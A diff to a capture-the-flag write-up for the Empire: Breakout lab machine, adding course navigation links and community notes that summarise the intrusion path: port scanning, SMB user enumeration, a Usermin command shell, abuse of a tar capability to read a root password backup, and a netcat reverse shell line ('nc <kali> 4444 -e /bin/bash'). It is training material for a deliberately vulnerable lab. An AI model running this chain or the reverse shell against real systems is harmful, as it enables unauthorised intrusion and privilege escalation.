@@ -12,6 +12,9 @@
 | **Target OS** | Debian 11 — Apache 2.4.51, Samba 4.6.2, **Webmin 1.981 (:10000)** and **Usermin 1.830 (:20000)** |
 | **Flags** | **Two** — `/home/cyber/user.txt` and `/root/rOOt.txt` |
 
+> ?? **Learning Path 1 ? Machine 8 of 13 ([Course Overview](../../Learning%20Path%201%20-%20Introduction%20to%20Cybersecurity/README.md) ? [????????? ???????? 1](../../%CE%9C%CE%B1%CE%B8%CE%B7%CF%83%CE%B9%CE%B1%CE%BA%CE%AE%20%CE%94%CE%B9%CE%B1%CE%B4%CF%81%CE%BF%CE%BC%CE%AE%201%20-%20%CE%95%CE%B9%CF%83%CE%B1%CE%B3%CF%89%CE%B3%CE%AE%20%CF%83%CF%84%CE%B7%CE%BD%20%CE%9A%CF%85%CE%B2%CE%B5%CF%81%CE%BD%CE%BF%CE%B1%CF%83%CF%86%CE%AC%CE%BB%CE%B5%CE%B9%CE%B1/README.md))**  
+> **Study the Lesson Card first** (theory, pre-lab questions, 5-rung hints ladder): **[English Card](../../Learning%20Path%201%20-%20Introduction%20to%20Cybersecurity/Machines/08-empire-breakout.md)** ? **[???????? ?????](../../%CE%9C%CE%B1%CE%B8%CE%B7%CF%83%CE%B9%CE%B1%CE%BA%CE%AE%20%CE%94%CE%B9%CE%B1%CE%B4%CF%81%CE%BF%CE%BC%CE%AE%201%20-%20%CE%95%CE%B9%CF%83%CE%B1%CE%B3%CF%89%CE%B3%CE%AE%20%CF%83%CF%84%CE%B7%CE%BD%20%CE%9A%CF%85%CE%B2%CE%B5%CF%81%CE%BD%CE%BF%CE%B1%CF%83%CF%86%CE%AC%CE%BB%CE%B5%CE%B9%CE%B1/%CE%9C%CE%B7%CF%87%CE%B1%CE%BD%CE%AD%CF%82/08-empire-breakout.md)** ? Previous in path: [Machine 7 ? Mr-Robot: 1](../3-053-mr-robot-1/README.md) ? Next in path: [Machine 9 ? CengBox: 1](../3-018-cengbox-1/README.md)
+
 Throughout we assume:
 
 ```text
@@ -1316,6 +1319,18 @@ drwxr-xr-x 4 cyber cyber 4096 May  4 18:40 ..
   - [Brainfuck language reference](https://esolangs.org/wiki/Brainfuck) · [splitbrain Ook! decoder](https://www.splitbrain.org/_static/ook/) · [copy.sh Brainfuck](https://copy.sh/brainfuck/)
   - [CyberChef](https://gchq.github.io/CyberChef/) · [enum4linux](https://github.com/CiscoCXSecurity/enum4linux) · [yescrypt (`$y$`) in Debian 11](https://www.debian.org/releases/bullseye/amd64/release-notes/ch-information.en.html)
   - [pentestmonkey — Reverse Shell Cheat Sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
+
+
+### Community notes — consensus, pitfalls and alternative routes (cross-checked against the sources below):
+
+- **Consensus chain:** full `nmap -p-` → `80/139/445/10000/20000` → brainfuck in the Apache page source → `.2uqPEfj3D<P'a-3` → SMB null session + RID cycling → user `cyber` → log in to **Usermin :20000** → Command Shell → `user.txt` → `getcap -r /` → `/home/cyber/tar cap_dac_read_search=ep` → archive+extract `/var/backups/.old_pass.bak` → `su root` → `/root/rOOt.txt`.
+- ⚠️ **Verification note — what the default scan shows.** Older text here claimed a default top-1,000 scan sees only 80/139/445. Checked against nmap's `nmap-services` frequency table (10000 ≈ rank 31, 20000 ≈ rank 541 → both in the default set) and the lab README, which agrees: a plain `nmap` **does** list them. The real pitfalls are scanning **without `-sV`** (both consoles stay anonymous `http`) and assuming the top-1,000 is enough in the wild (8443/9090/10443/3000 live outside it). Keep `-p- -sV` as your default habit.
+- ⚠️ **Verification note — file details.** Three writeups (0bfxgh0st, The Village Hacker, Security Akademeia) show `/var/backups/.old_pass.bak` as **17 bytes, dated 20 Oct 2021** (16-character password + newline) and `/home/cyber/tar` as **531928 bytes, Oct 19 2021** — earlier text in this card said 16 bytes / 19 Oct, now corrected.
+- **Common pitfall:** `cyber` fails on Webmin :10000 but succeeds on Usermin :20000 — test **every** credential against **every** login surface, and read the login page title rather than nmap's identical `MiniServ … (Webmin httpd)` banners.
+- **Common pitfall:** `su root` inside the Usermin Command Shell fails (`Authentication failure`, per Security Akademeia) — get a real reverse shell first (Step 6); The Village Hacker and Security Akademeia both show `su root` working from the plain reverse shell, and upgrading with `python3 pty.spawn` afterwards fixes prompts, tab completion and password entry.
+- **Alternative routes:** `rpcclient -U "" -N` with a `lookupsids S-1-22-1-$i` loop or `crackmapexec smb --rid-brute` instead of `enum4linux` (0bfxgh0st); CyberArri archived the **whole directory** (`cd /tmp && /home/cyber/tar -cvf new.tar /var/backups`) instead of one file; `nc <kali> 4444 -e /bin/bash` from the web box when netcat exists (CyberArri); and once you hold root's password, **Webmin :10000 accepts `root`** — its own Command Shell reads `rOOt.txt` for you (Security Akademeia, step 21).
+- **Also note:** the root flag is `rOOt.txt` with a capital "O" — `ls -la` before assuming `r00t.txt`. The Proving Grounds Play variant of this machine (The Village Hacker) ships `local.txt` instead of `user.txt`; the content chain is otherwise identical.
+- **Verified sources:** [Ra-Sec](https://ra2302.github.io/posts/Breakout/) · [The Village Hacker](https://thevillagehacker-security.gitbook.io/ctf-writeups/2023-10-01-proving_grounds_play-empire-breakout) · [0bfxgh0st](https://0bfxgh0st.github.io/vulnhub/empire-breakout/) · [CyberArri](https://cyberarri.com/2022/07/25/empire-breakout/)
 
 ---
 
